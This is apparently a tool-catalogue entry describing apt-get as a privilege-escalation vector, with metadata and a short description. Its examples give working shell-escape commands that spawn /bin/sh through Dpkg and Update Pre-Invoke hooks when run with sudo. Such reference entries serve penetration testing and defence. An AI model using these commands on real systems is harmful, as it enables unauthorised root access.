---
id: package-apt-apt-get
namespace: package:apt:apt-get
name: apt-get
description: APT package manager that can execute arbitrary commands via dpkg pre-invoke hooks or update pre-invoke.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.execution.command
  - security.privilege-escalation.shell
  - system.package.install
platforms:
  - linux
risk_level: medium
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - apt
  - aptitude
  - dpkg
artifacts: []
workflow_edges:
  produces:
    - shell-access
    - command-output
  consumes:
    - config-file
contract:
  inputs:
    - type: system.package.name
      description: Package name to install
  outputs:
    - type: process.output
      description: Command execution output
  side_effects:
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 32
    network: medium
    disk_io: medium
resource_profile:
  cpu: low
  memory_mb: 32
  network: medium
  disk_io: medium
allowed-tools:
  - apt-get
  - apt
  - Bash
  - execFile
parameters:
  - name: y
    type: string
    required: false
    description: "Assume yes to prompts"
    aliases:
      - -y
  - name: install
    type: string
    required: false
    description: "Install packages"
    aliases:
      - install
  - name: c
    type: file
    required: false
    description: "Config file"
    aliases:
      - -c
  - name: o
    type: string
    required: false
    description: "Set an arbitrary config option"
    aliases:
      - -o
features:
  - process-manip
execution:
  template: "apt-get {y} {install} {c} {o}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Spawn shell via Dpkg Pre-Invoke config
    command: |-
      echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
      apt-get -y install -c /path/to/temp-file sl
  - description: Spawn shell via Update Pre-Invoke option
    command: apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
  - description: Read changelogs via less pager
    command: apt-get changelog apt
references:
  - label: "apt-get man page"
    url: "https://man7.org/linux/man-pages/man8/apt-get.8.html"
techniques:
  - privilege-escalation
  - execution
install:
    - method: apt
      commands:
        - "apt-get install -y apt"
---


# apt-get — APT Package Manager

apt-get is the command-line package manager for Debian-based systems. It can be abused to execute arbitrary commands via Dpkg pre-invoke hooks or update pre-invoke options when used with sudo or SUID.
